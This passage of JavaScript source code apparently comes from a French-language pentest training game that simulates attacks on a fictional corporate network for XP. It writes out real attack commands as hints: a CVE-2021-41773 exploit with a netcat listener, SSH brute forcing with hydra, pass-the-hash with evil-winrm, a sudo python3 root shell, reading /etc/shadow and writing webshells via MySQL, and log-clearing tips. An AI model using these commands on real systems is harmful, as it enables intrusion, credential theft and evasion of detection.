        pedagogie: 'Les credentials de BDD se trouvent dans les fichiers de config des applis web (wp-config.php, .env, application.yml, config.php) ou dans des emails/documents internes.',
        effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    const uIdx = args.indexOf('-u');
    const user = uIdx !== -1 ? args[uIdx + 1] : '';
    const passArg = args.find(a => a.startsWith('-p') && a.length > 2);
    const pass = passArg ? passArg.slice(2) : '';

    if (user !== 'db_user' || pass !== 'Str0ngP@ss') {
      return {
        output: `\x1b[31mERROR 1045 (28000): Access denied for user '${user || '?'}'@'10.0.0.1' (using password: ${pass ? 'YES' : 'NO'})\x1b[0m\n\x1b[33m💡 Credentials trouvés lors de l\'exploitation précédente : db_user / Str0ngP@ss\x1b[0m`,
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    const dbMachine = MACHINES.find(m => m.id === 'dbserver');
    return enterMachine(dbMachine, [
      `Welcome to the MySQL monitor.  Commands end with ; or \\g.`,
      `Your MySQL connection id is 42`,
      `Server version: 5.7.38-log MySQL Community Server (GPL)`,
      '',
      '\x1b[32m╔══════════════════════════════════════════════════╗\x1b[0m',
      `\x1b[32m║  🗄  MySQL SHELL — DB Server (${ip})         ║\x1b[0m`,
      '\x1b[32m╚══════════════════════════════════════════════════╝\x1b[0m',
      '',
      `  OS      : CentOS 7 / MySQL 5.7.38`,
      `  User    : db_user@db-server`,
      `  FILE    : ACTIVÉ (lecture/écriture de fichiers système)`,
      '',
      '\x1b[33m━━━ PHASE 1 : RECONNAISSANCE ━━━━━━━━━━━━━━━━━━━━━\x1b[0m',
      '  recon / show databases; / show tables; / select version();',
      '',
      '\x1b[35mORACLE > MySQL connecté. Explore les bases de données.\x1b[0m',
    ],
    'Connexion MySQL distante avec credentials découverts lors de la phase précédente. Le privilege FILE permet via SELECT LOAD_FILE() de lire des fichiers système arbitraires, ou via SELECT INTO OUTFILE d\'écrire des webshells.',
    20, state);
  }

  // ── evil-winrm : accès au Domain Controller ──
  if (cmd === 'evil-winrm') {
    const iIdx = args.indexOf('-i');
    const ip = iIdx !== -1 ? args[iIdx + 1] : args.find(a => /192\.168\.1\.\d+/.test(a));

    if (!ip) return { output: 'Usage: evil-winrm -i <ip> -u <user> -H <ntlm_hash>\nOu: evil-winrm -i <ip> -u <user> -p <password>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const machine = getMachineByIP(ip);
    if (!machine || machine.id !== 'dc') {
      return { output: `evil-winrm: Connection failed to ${ip} (WinRM not available)`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (isLocked(machine, state)) {
      return {
        output: `\x1b[31mevil-winrm: Connection refused — ${ip} inaccessible depuis ta position.\x1b[0m\nCompromets d\'abord le DB Server pour débloquer le pivot vers le DC.`,
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!hasDCHash(state)) {
      return {
        output: [
          `\x1b[31mevil-winrm: Connection failed — credentials insuffisants.\x1b[0m`,
          '',
          '\x1b[33m💡 Tu dois d\'abord extraire les hashes NTLM depuis le DB Server.\x1b[0m',
          '   Les hashes apparaissent lors de l\'exploitation du DB Server.',
        ].join('\n'),
        pedagogie: 'Les hashes NTLM Windows se trouvent dans NTDS.dit (DC), la SAM (postes locaux), via secretsdump.py, mimikatz, ou en lisant la mémoire LSASS.',
        effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    const uIdx = args.indexOf('-u');
    const user = uIdx !== -1 ? args[uIdx + 1] : 'Administrator';
    const hIdx = args.indexOf('-H');
    const hash = hIdx !== -1 ? args[hIdx + 1] : '<hash>';

    const dcMachine = MACHINES.find(m => m.id === 'dc');
    return enterMachine(dcMachine, [
      '\x1b[32mInfo: Establishing connection to remote endpoint\x1b[0m',
      `\x1b[32m*Evil-WinRM* PS C:\\Users\\${user}\\Documents>\x1b[0m`,
      '',
      '\x1b[32m╔══════════════════════════════════════════════════╗\x1b[0m',
      `\x1b[32m║  👑 WinRM SHELL — Domain Controller (${ip}) ║\x1b[0m`,
      '\x1b[32m╚══════════════════════════════════════════════════╝\x1b[0m',
      '',
      `  OS      : Windows Server 2019 (Build 17763)`,
      `  Domain  : CORP.LOCAL`,
      `  User    : ${user} (Pass-the-Hash)`,
      `  Hash    : ${hash.substring(0, 16)}...`,
      '',
      '\x1b[33m━━━ PHASE 1 : RECONNAISSANCE ━━━━━━━━━━━━━━━━━━━━━\x1b[0m',
      '  recon / whoami /all / net user /domain / hostname',
      '',
      '\x1b[35mORACLE > Tu es sur le DC. La fin est proche.\x1b[0m',
    ],
    'Evil-WinRM exploite le service WinRM (port 5985/5986) pour obtenir un shell PowerShell. Le Pass-the-Hash (PtH) permet de s\'authentifier avec un hash NTLM sans connaître le mot de passe en clair — Windows accepte le hash directement dans le protocole NTLM.',
    30, state);
  }

  // ── impacket / psexec ──
  if (cmd === 'psexec.py' || cmd === 'secretsdump.py' || cmd === 'impacket') {
    return {
      output: '\x1b[33m💡 Bonne direction ! Utilise evil-winrm pour te connecter au DC :\x1b[0m\n\x1b[36m   evil-winrm -i 192.168.1.100 -u Administrator -H <ntlm_hash>\x1b[0m',
      pedagogie: 'La suite Impacket offre psexec.py, wmiexec.py, secretsdump.py, GetUserSPNs.py et bien d\'autres. Ici evil-winrm est l\'outil modélisé pour la connexion WinRM.',
      effect: null, xpBonus: 5, stateChanges: {}
    };
  }

  // ── cd → erreur éducative ──
  if (cmd === 'cd') {
    const target = args[0];
    if (!target) return { output: 'bash: cd: argument manquant', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const machine = getMachineByIP(target) || getMachineByIdOrName(target);
    if (machine) {
      const hints = {
        webserver:  `nc -lvnp 4444  puis  python3 cve-2021-41773.py ${machine.ip} 4444`,
        mailserver: `hydra -l admin -P rockyou.txt ${machine.ip} ssh  puis  ssh admin@${machine.ip}`,
        dbserver:   `mysql -h ${machine.ip} -u db_user -pStr0ngP@ss`,
        dc:         `evil-winrm -i ${machine.ip} -u Administrator -H <ntlm_hash>`,
      };
      return {
        output: [
          `\x1b[31mbash: cd: ${target}: Not a directory\x1b[0m`,
          '',
          '\x1b[33m💡 "cd" navigue dans des répertoires locaux — impossible de "cd" vers une IP.\x1b[0m',
          `   Pour accéder à ${machine.name}, utilise :`,
          `\x1b[36m   ${hints[machine.id] || `connect ${machine.ip}`}\x1b[0m`,
        ].join('\n'),
        pedagogie: 'En pentest : ssh/scp pour Linux, evil-winrm/psexec pour Windows, mysql/psql pour les BDD, et un exploit pour l\'accès initial. "cd" est uniquement pour la navigation locale du filesystem.',
        effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    return { output: `bash: cd: ${target}: No such file or directory`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  // ── searchsploit ──
  if (cmd === 'searchsploit') {
    const query = joined.toLowerCase();
    if (query.includes('apache') || query.includes('41773')) {
      return {
        output: [
          '----------------------------------------------------------------------',
          ' Exploit Title                                    |  Path',
          '----------------------------------------------------------------------',
          '\x1b[32m Apache HTTP Server 2.4.49 - Path Traversal & RCE | exploits/linux/webapps/50383.py\x1b[0m',
          ' Apache HTTP Server 2.4.50 - Path Traversal & RCE | exploits/linux/webapps/50406.py',
          '----------------------------------------------------------------------',
          '',
          '\x1b[33m💡 CVE-2021-41773 confirmé ! Lance l\'exploit :\x1b[0m',
          '\x1b[36m   nc -lvnp 4444\x1b[0m',
          '\x1b[36m   python3 50383.py 192.168.1.10 4444\x1b[0m',
        ].join('\n'),
        pedagogie: 'searchsploit interroge la base Exploit-DB locale. Résultats : scripts Python/Ruby, modules Metasploit, PoC C. Toujours vérifier la version exacte avant d\'exploiter.',
        effect: null, xpBonus: 10, stateChanges: {}
      };
    }
    return {
      output: `Searching for "${joined}" in Exploit-DB...\nAucun résultat pertinent. Essaie avec le nom d\'application et la version.`,
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── scores ──
  if (cmd === 'scores' || cmd === 'scoreboard') {
    return { output: '', pedagogie: null, effect: { type: 'SHOW_SCORES' }, xpBonus: 0, stateChanges: {} };
  }

  return {
    output: `\x1b[31mbash: ${cmd}: command not found\x1b[0m\nTape \x1b[33mhelp\x1b[0m pour les commandes disponibles.`,
    pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
  };
}

// ─── Machine mode — Linux (web + mail) ───────────────────────────────────────

function handleLinuxMachine(cmd, args, state, machine) {
  const scenario = MACHINE_SCENARIOS[machine.id];
  const phase = state.machinePhase;

  if (cmd === 'help') {
    return {
      output: [
        `\x1b[36m╔══════════════════════════════════════════╗\x1b[0m`,
        `\x1b[36m║  SHELL — ${machine.name.padEnd(32)}║\x1b[0m`,
        `\x1b[36m╚══════════════════════════════════════════╝\x1b[0m`,
        '',
        '\x1b[33mRECONNAISSANCE :\x1b[0m',
        '  recon / id / whoami / uname -a / hostname',
        '  cat /etc/os-release / ls -la / ps aux',
        '',
        '\x1b[33mSCANNING :\x1b[0m',
        '  nmap -sV <ip> / nikto -h <ip> / dirb http://<ip>',
        '  searchsploit <app> / gobuster dir -u http://<ip> -w wordlist',
        '',
        '\x1b[33mEXPLOITATION :\x1b[0m',
        '  exploit / sqlmap -u <url> / hydra / curl / nc',
        '',
        '\x1b[33mPOST-EXPLOITATION :\x1b[0m',
        '  sudo -l / find / -perm -4000 2>/dev/null',
        '  sudo python3 -c \'import os; os.system("/bin/bash")\'',
        '  cat /flag.txt / cat /root/flag.txt',
        '',
        '  exit → revenir au réseau',
      ].join('\n'),
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  if (cmd === 'hint') {
    const phaseHints = [
      [`\x1b[33m💡 Phase RECON :\x1b[0m`, `  \x1b[36mrecon\x1b[0m ou \x1b[36mid\x1b[0m ou \x1b[36muname -a\x1b[0m`, machine.hints[0] ? `  Info: ${machine.hints[0]}` : ''],
      [`\x1b[33m💡 Phase SCAN :\x1b[0m`, `  \x1b[36mnmap -sV ${machine.ip}\x1b[0m ou \x1b[36mnikto -h ${machine.ip}\x1b[0m`, machine.hints[1] ? `  Info: ${machine.hints[1]}` : ''],
      [`\x1b[33m💡 Phase EXPLOIT :\x1b[0m`, `  \x1b[36mexploit\x1b[0m ou \x1b[36msqlmap\x1b[0m ou \x1b[36mhydra\x1b[0m`, machine.hints[2] ? `  Info: ${machine.hints[2]}` : ''],
      [`\x1b[33m💡 Phase POST-EXPLOIT :\x1b[0m`, `  \x1b[36msudo -l\x1b[0m → \x1b[36msudo python3 -c 'import os; os.system("/bin/bash")'\x1b[0m → \x1b[36mcat /flag.txt\x1b[0m`],
    ];
    const idx = Math.min(phase, phaseHints.length - 1);
    return { output: phaseHints[idx].filter(Boolean).join('\n'), pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'exit' || cmd === 'logout') {
    return {
      output: `\x1b[33m[DÉCONNEXION] Fermeture du shell sur ${machine.ip}\x1b[0m`,
      pedagogie: 'En post-exploitation : supprimer les traces (logs bash, fichiers déposés, connexions dans /var/log/auth.log). C\'est ce qu\'on appelle "cleaning up".',
      effect: { type: 'EXIT_MACHINE' },
      xpBonus: 0,
      stateChanges: { mode: 'NETWORK', currentMachine: null, rootObtained: false }
    };
  }

  // ─── Phase 0→1 : Reconnaissance ──────────────────────────────────────────
  const reconCmds = ['recon', 'whois', 'dig', 'id', 'uname', 'hostname', 'ifconfig', 'ip'];
  if (reconCmds.includes(cmd) || (cmd === 'cat' && args[0] === '/etc/os-release')) {
    if (phase >= 1) return { output: `\x1b[33m[Déjà fait]\x1b[0m Recon complétée. Phase actuelle : ${getPhaseName(phase)}.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const pr = scenario.phase_recon;
    return {
      output: [
        `\x1b[36m╔═══════════════════════════════════════╗\x1b[0m`,
        `\x1b[36m║  PHASE 1 — RECONNAISSANCE             ║\x1b[0m`,
        `\x1b[36m╚═══════════════════════════════════════╝\x1b[0m`,
        `Cible : ${machine.ip} (${machine.name}) — ${machine.os}`,
        '',
        ...pr.reveals.map(r => `\x1b[33m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ Reconnaissance terminée ! +${pr.xp} XP\x1b[0m`,
        `\x1b[37m→ Scanning : nmap -sV ${machine.ip} | nikto -h ${machine.ip} | searchsploit\x1b[0m`,
      ].join('\n'),
      pedagogie: 'La reconnaissance sur une machine déjà compromise inclut : identité (id/whoami), kernel (uname -a), réseau (ip a, netstat), processus (ps aux), crons (crontab -l), services (systemctl).',
      effect: { type: 'PHASE_COMPLETE', phase: 'RECON', machineId: machine.id },
      xpBonus: pr.xp,
      stateChanges: { machinePhase: 1 }
    };
  }

  // ─── Phase 1→2 : Scanning ────────────────────────────────────────────────
  const scanCmds = ['nmap', 'nikto', 'dirb', 'gobuster', 'searchsploit', 'feroxbuster', 'wfuzz', 'ffuf', 'smtp-user-enum'];
  if (scanCmds.includes(cmd)) {
    if (phase < 1) return { output: `\x1b[31m[!] Lance d\'abord la reconnaissance : recon\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 2) return { output: `\x1b[33m[Déjà fait]\x1b[0m Scanning complété. Passe à l\'exploitation.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const ps = scenario.phase_scan;
    const pedas = {
      nmap: 'nmap -sV -sC : scripts NSE en plus de la détection de versions. -p- scanne tous les 65535 ports. -A active la détection d\'OS, le traceroute et les scripts.',
      nikto: 'Nikto : scanner web qui teste > 6700 fichiers/CGIs dangereux, versions obsolètes, configs non sécurisées. Bruyant — déclenche les IDS.',
      dirb: 'dirb brute-force les répertoires web avec une wordlist. Équivalents modernes : gobuster, feroxbuster (multi-thread), ffuf. Découverte de /admin, /backup, /api.',
      searchsploit: 'searchsploit cherche dans Exploit-DB local. Toujours vérifier la version exacte. Copier le script : searchsploit -m <id>.',
      gobuster: 'gobuster est plus rapide que dirb. Mode dir pour répertoires, dns pour sous-domaines, vhost pour virtual hosts.',
    };
    return {
      output: [
        `\x1b[36m╔═══════════════════════════════════════╗\x1b[0m`,
        `\x1b[36m║  PHASE 2 — SCANNING & ENUMÉRATION     ║\x1b[0m`,
        `\x1b[36m╚═══════════════════════════════════════╝\x1b[0m`,
        `Target : ${machine.ip}`,
        '',
        ...ps.reveals.map(r => `\x1b[33m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ Scanning terminé ! +${ps.xp} XP\x1b[0m`,
        `\x1b[37m→ Exploitation : exploit / sqlmap / hydra / nc / curl\x1b[0m`,
      ].join('\n'),
      pedagogie: pedas[cmd] || 'Scanning approfondi terminé.',
      effect: { type: 'PHASE_COMPLETE', phase: 'SCAN', machineId: machine.id },
      xpBonus: ps.xp,
      stateChanges: { machinePhase: 2 }
    };
  }

  // ─── Phase 2→3 : Exploitation ─────────────────────────────────────────────
  const exploitCmds = ['sqlmap', 'hydra', 'curl', 'nc', 'exploit', 'python3', 'msfconsole', 'metasploit', 'burpsuite'];
  if (exploitCmds.includes(cmd)) {
    if (phase < 2) return { output: `\x1b[31m[!] Tu n\'as pas encore scanné la machine.\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 3) return { output: `\x1b[33m[Déjà fait]\x1b[0m Exploitation complétée. Lance : id / sudo -l / cat /flag.txt`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const pe = scenario.phase_exploit;
    const pedas = {
      sqlmap: 'sqlmap automatise la détection et l\'exploitation des injections SQL : --dbs (bases), --tables (tables), --dump (données), --os-shell (shell via SQLi). Toujours sur cibles autorisées.',
      hydra: 'Hydra brute-force multi-protocoles. Ici il casse SSH, SMTP, ou une auth web.',
      curl: 'curl permet d\'envoyer des requêtes HTTP manuellement : tester des payloads, lire des headers, uploader des fichiers via multipart.',
      nc: 'netcat : établit des connexions TCP/UDP brutes. Utilisé pour les reverse shells, l\'écoute de ports, le transfert de fichiers.',
      exploit: 'L\'exploit tire parti de la CVE identifiée lors du scanning pour obtenir un accès non autorisé.',
    };
    return {
      output: [
        `\x1b[36m╔═══════════════════════════════════════╗\x1b[0m`,
        `\x1b[36m║  PHASE 3 — EXPLOITATION               ║\x1b[0m`,
        `\x1b[36m╚═══════════════════════════════════════╝\x1b[0m`,
        '',
        ...pe.reveals.map(r => `\x1b[31m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ Exploitation réussie ! +${pe.xp} XP\x1b[0m`,
        `\x1b[37m→ Post-exploitation : id → sudo -l → sudo python3 ... → cat /flag.txt\x1b[0m`,
      ].join('\n'),
      pedagogie: pedas[cmd] || 'Exploitation réussie.',
      effect: { type: 'PHASE_COMPLETE', phase: 'EXPLOIT', machineId: machine.id },
      xpBonus: pe.xp,
      stateChanges: { machinePhase: 3 }
    };
  }

  // ─── Phase 3 : Post-exploitation ─────────────────────────────────────────
  if (cmd === 'whoami' || cmd === 'id') {
    if (phase < 3) return { output: `\x1b[33mTu n\'es pas encore sur la machine. Exploite-la d\'abord.\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const user = state.rootObtained ? 'root' : 'www-data';
    const uid = state.rootObtained ? 'uid=0(root) gid=0(root) groups=0(root)' : 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';
    return {
      output: `${uid}\n${state.rootObtained ? '' : '\x1b[33m💡 Tu es www-data, pas root. Escalade : sudo -l\x1b[0m'}`,
      pedagogie: 'id donne uid, gid, et groupes. uid=0 = root. Chercher aussi dans sudo, SUID, capabilities, cron, services mal configurés.',
      effect: null, xpBonus: 5, stateChanges: {}
    };
  }

  if (cmd === 'uname') {
    if (phase < 3) return { output: 'bash: uname: permission denied', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    return {
      output: `Linux ${machine.ip.replace(/\./g, '-')} 5.4.0-182-generic #202-Ubuntu SMP Fri Apr 26 12:29:36 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux`,
      pedagogie: 'uname -a révèle le kernel. Cherche des exploits kernel (DirtyPipe CVE-2022-0847, DirtyCOW CVE-2016-5195) si sudo/SUID ne suffisent pas.',
      effect: null, xpBonus: 5, stateChanges: {}
    };
  }

  if (cmd === 'sudo') {
    if (phase < 3) return { output: `sudo: tu n\'as pas encore d\'accès à cette machine.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (args[0] === '-l') {
      return {
        output: [
          `Matching Defaults entries for www-data on ${machine.ip}:`,
          '    env_reset, mail_badpass',
          '',
          `User www-data may run the following commands on ${machine.ip}:`,
          `\x1b[32m    (root) NOPASSWD: /usr/bin/python3\x1b[0m`,
          '',
          '\x1b[33m💡 PrivEsc trouvée ! python3 NOPASSWD → shell root :\x1b[0m',
          `\x1b[36m   sudo python3 -c 'import os; os.system("/bin/bash")'\x1b[0m`,
          '   (Référence : GTFOBins — gtfobins.github.io)',
        ].join('\n'),
        pedagogie: 'sudo -l liste les commandes exécutables en root. NOPASSWD + python3/vim/find/bash = escalade immédiate. Voir GTFOBins pour la technique par binaire.',
        effect: null, xpBonus: 20, stateChanges: {}
      };
    }
    const cmdLine = args.join(' ');
    if (cmdLine.includes('python3') || cmdLine.includes('python') || cmdLine.includes('su')) {
      return {
        output: [
          '\x1b[32m[+] Élévation de privilèges réussie !\x1b[0m',
          `root@${machine.ip.replace(/\./g, '-')}:~# id`,
          'uid=0(root) gid=0(root) groups=0(root)',
          '',
          '\x1b[32m🎉 ROOT obtenu ! Capture le flag :\x1b[0m',
          '\x1b[36m   cat /root/flag.txt\x1b[0m',
        ].join('\n'),
        pedagogie: 'sudo python3 → import os + os.system("/bin/bash") spawne un shell bash avec les droits de l\'utilisateur sudo, soit root. Technique classique dans GTFOBins.',
        effect: { type: 'ROOT_OBTAINED', machineId: machine.id },
        xpBonus: 50,
        stateChanges: { rootObtained: true }
      };
    }
    return { output: 'sudo: commande inconnue. Essaie : sudo -l', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'find') {
    if (phase < 3) return { output: 'find: permission denied', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    return {
      output: [
        '/usr/bin/python3',
        '/usr/bin/pkexec',
        '/usr/bin/passwd',
        '/bin/mount',
        '/bin/su',
        '',
        '\x1b[33m💡 /usr/bin/python3 SUID → sudo -l pour vérifier\x1b[0m',
      ].join('\n'),
      pedagogie: 'find / -perm -4000 2>/dev/null liste tous les binaires SUID. Si le propriétaire est root, ils s\'exécutent avec ses droits. Voir GTFOBins pour l\'exploitation par binaire.',
      effect: null, xpBonus: 10, stateChanges: {}
    };
  }

  if (cmd === 'cat') {
    const target = args[0];
    if (!target) return { output: 'Usage: cat <fichier>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const isFlag = ['/flag.txt', 'flag.txt', '/root/flag.txt', '/root/flag', '/tmp/flag.txt'].includes(target);
    if (isFlag) {
      if (phase < 3) return { output: `cat: ${target}: No such file or directory`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
      if (!state.rootObtained) {
        return {
          output: `\x1b[31mcat: ${target}: Permission denied\x1b[0m\n\x1b[33m💡 Tu dois être root. Lance : sudo -l\x1b[0m`,
          pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
        };
      }
      return captureFlagAndFinish(machine, state, scenario);
    }

    if (phase < 3) return { output: `cat: ${target}: No such file or directory`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (target.includes('postfix') || target.includes('main.cf')) {
      return {
        output: [
          '# Postfix main.cf',
          'myhostname = mail.corp.local',
          'mydomain = corp.local',
          'smtpd_banner = $myhostname ESMTP $mail_name',
          '\x1b[32mldap_bind_dn = cn=service,dc=corp,dc=local\x1b[0m',
          '\x1b[32mldap_bind_pw = C0rpS3cr3t\x1b[0m',
          'mynetworks = 127.0.0.0/8, 192.168.1.0/24',
        ].join('\n'),
        pedagogie: 'Les fichiers de configuration contiennent souvent des credentials en clair. /etc/postfix/main.cf, /etc/mysql/my.cnf, /var/www/html/config.php sont des cibles classiques.',
        effect: null, xpBonus: 15, stateChanges: {}
      };
    }
    if (target.includes('passwd')) {
      return {
        output: 'root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        pedagogie: '/etc/passwd liste tous les utilisateurs. Les utilisateurs avec /bin/bash ont un shell interactif. Combine avec /etc/shadow pour craquer les hashes.',
        effect: null, xpBonus: 5, stateChanges: {}
      };
    }
    return { output: `cat: ${target}: No such file or directory`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'scores' || cmd === 'scoreboard') {
    return { output: '', pedagogie: null, effect: { type: 'SHOW_SCORES' }, xpBonus: 0, stateChanges: {} };
  }

  return {
    output: `\x1b[31mbash: ${cmd}: command not found\x1b[0m\nTape \x1b[33mhelp\x1b[0m pour les commandes disponibles.`,
    pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
  };
}

// ─── Machine mode — MySQL (DB Server) ────────────────────────────────────────

function handleDBMachine(cmd, args, state, machine) {
  const scenario = MACHINE_SCENARIOS.dbserver;
  const phase = state.machinePhase;
  const fullCmd = cmd + (args.length ? ' ' + args.join(' ') : '');

  if (cmd === 'help') {
    return {
      output: [
        '\x1b[36m╔══════════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  MySQL SHELL — DB Server                 ║\x1b[0m',
        '\x1b[36m╚══════════════════════════════════════════╝\x1b[0m',
        '',
        '\x1b[33mRECONNAISSANCE :\x1b[0m',
        '  show databases;        Lister les bases',
        '  select version();      Version MySQL',
        '  recon                  Résumé complet',
        '',
        '\x1b[33mENUMÉRATION :\x1b[0m',
        '  use <database>;        Sélectionner une base',
        '  show tables;           Lister les tables',
        '  describe <table>;      Structure d\'une table',
        '',
        '\x1b[33mEXPLOITATION :\x1b[0m',
        '  select * from <table>;                  Lire les données',
        '  SELECT LOAD_FILE(\'/etc/shadow\');         Lire fichiers système',
        '  SELECT ... INTO OUTFILE \'/tmp/shell.php\'; Écrire un webshell',
        '',
        '\x1b[33mPOST-EXPLOITATION :\x1b[0m',
        '  cat /flag.txt   (flag final après dump)',
        '',
        '  exit → revenir au réseau',
      ].join('\n'),
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  if (cmd === 'hint') {
    const hints = [
      ['\x1b[33m💡 Phase RECON :\x1b[0m', '  \x1b[36mshow databases;\x1b[0m  ou  \x1b[36mrecon\x1b[0m'],
      ['\x1b[33m💡 Phase ENUM :\x1b[0m', '  \x1b[36muse corp_db;\x1b[0m  puis  \x1b[36mshow tables;\x1b[0m'],
      ['\x1b[33m💡 Phase EXPLOIT :\x1b[0m', '  \x1b[36mSELECT * FROM credentials;\x1b[0m', '  \x1b[36mSELECT LOAD_FILE(\'/etc/shadow\');\x1b[0m'],
      ['\x1b[33m💡 Phase POST :\x1b[0m', '  \x1b[36mcat /flag.txt\x1b[0m'],
    ];
    return { output: hints[Math.min(phase, hints.length-1)].join('\n'), pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'exit' || cmd === 'quit' || fullCmd.includes('quit;') || fullCmd.includes('exit;')) {
    return {
      output: '\x1b[33mBye — déconnexion MySQL\x1b[0m',
      pedagogie: 'Après exfiltration, nettoyer les logs MySQL : FLUSH LOGS; et supprimer les fichiers créés via OUTFILE.',
      effect: { type: 'EXIT_MACHINE' },
      xpBonus: 0,
      stateChanges: { mode: 'NETWORK', currentMachine: null, rootObtained: false }
    };
  }

  // Phase 0→1 : show databases / recon
  const isRecon = cmd === 'recon' || cmd === 'show' || (cmd === 'select' && args.join(' ').includes('version'));
  if (isRecon) {
    if (phase >= 1) return { output: '\x1b[33m[Déjà fait]\x1b[0m Base de données explorée. Phase : ' + getPhaseName(phase), pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const pr = scenario.phase_recon;
    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 1 — EXPLORATION MySQL          ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...pr.reveals.map(r => r.startsWith('mysql>') || r.startsWith('+') || r.startsWith('|') ? `\x1b[37m${r}\x1b[0m` : `\x1b[33m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ +${pr.xp} XP\x1b[0m`,
        '\x1b[37m→ use corp_db;  puis  show tables;\x1b[0m',
      ].join('\n'),
      pedagogie: 'MySQL : SHOW DATABASES liste les bases accessibles par l\'utilisateur courant. information_schema contient les métadonnées (structure de toutes les bases). mysql contient les utilisateurs et permissions.',
      effect: null, xpBonus: pr.xp,
      stateChanges: { machinePhase: 1 }
    };
  }

  // Phase 1→2 : use/describe/show tables
  const isScan = (cmd === 'use') || (cmd === 'describe' || cmd === 'desc') ||
                 (cmd === 'show' && args.includes('tables;')) ||
                 (cmd === 'show' && args.join(' ').includes('table'));
  if (isScan) {
    if (phase < 1) return { output: '\x1b[31m[!] Lance d\'abord : show databases;\x1b[0m', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 2) return { output: '\x1b[33m[Déjà fait]\x1b[0m Tables énumérées. Passe à l\'exploitation.', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const ps = scenario.phase_scan;
    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 2 — ÉNUMÉRATION DES TABLES     ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...ps.reveals.map(r => r.startsWith('mysql>') || r.startsWith('|') || r.startsWith('+') ? `\x1b[37m${r}\x1b[0m` : `\x1b[33m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ +${ps.xp} XP\x1b[0m`,
        '\x1b[37m→ SELECT * FROM credentials;  /  SELECT LOAD_FILE(\'/etc/shadow\');\x1b[0m',
      ].join('\n'),
      pedagogie: 'USE <db> sélectionne une base. SHOW TABLES liste ses tables. DESCRIBE <table> montre la structure (colonnes, types, clés). Les tables nommées credentials, users, secrets sont des cibles prioritaires.',
      effect: null, xpBonus: ps.xp,
      stateChanges: { machinePhase: 2 }
    };
  }

  // Phase 2→3 : SELECT / LOAD_FILE / dump
  const isExploit = cmd === 'select' || cmd === 'SELECT' ||
                    cmd === 'mysqldump' ||
                    (fullCmd.toLowerCase().includes('load_file') || fullCmd.toLowerCase().includes('outfile'));
  if (isExploit) {
    if (phase < 2) return { output: '\x1b[31m[!] Énumère d\'abord les tables : use corp_db; show tables;\x1b[0m', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 3) return { output: '\x1b[33m[Déjà fait]\x1b[0m Données exfiltrées. Lance : cat /flag.txt', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const pe = scenario.phase_exploit;
    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 3 — EXFILTRATION               ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...pe.reveals.map(r => `\x1b[31m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ +${pe.xp} XP\x1b[0m`,
        '\x1b[37m→ cat /flag.txt  pour capturer le flag\x1b[0m',
      ].join('\n'),
      pedagogie: 'SELECT LOAD_FILE() est possible si l\'utilisateur MySQL a le privilege FILE et que le fichier est lisible par mysql (world-readable). Technique utilisée pour lire /etc/passwd, /etc/shadow, des clés SSH.',
      effect: null, xpBonus: pe.xp,
